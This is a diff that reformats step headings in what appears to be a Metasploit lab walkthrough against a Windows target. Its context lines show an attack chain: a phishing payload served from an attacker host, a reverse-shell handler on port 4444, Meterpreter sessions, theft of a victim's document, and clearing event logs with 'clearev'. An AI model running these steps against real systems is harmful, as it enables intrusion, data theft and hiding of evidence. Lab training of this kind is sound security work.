@@ -32,7 +32,7 @@ On Windows Target:
 Download the payload via browser:
 http://192.168.XX.X:8080/phishing_payload.exe
 
-##Step 4: Metasploit Handler
+## Step 4: Metasploit Handler
 Start Metasploit:
 msfconsole
 
@@ -44,7 +44,7 @@ set LPORT 4444
 run -j
 
 
-##Step 5: Initial Access & Meterpreter Shell
+## Step 5: Initial Access & Meterpreter Shell
 Once payload is executed from Windows:
 sessions
 sessions -i [ID]
@@ -67,14 +67,14 @@ run
 After successful privesc, confirm with:
 getuid
 
-##Step 7: File Search & Exfiltration
+## Step 7: File Search & Exfiltration
 search -f *.docx
 
 Download Files:
 download C:\\Users\\Victim\\Documents\\secret.docx
 
 
-##Step 8: Covering Tracks
+## Step 8: Covering Tracks
 Clear Windows Event Logs:
 clearev
 
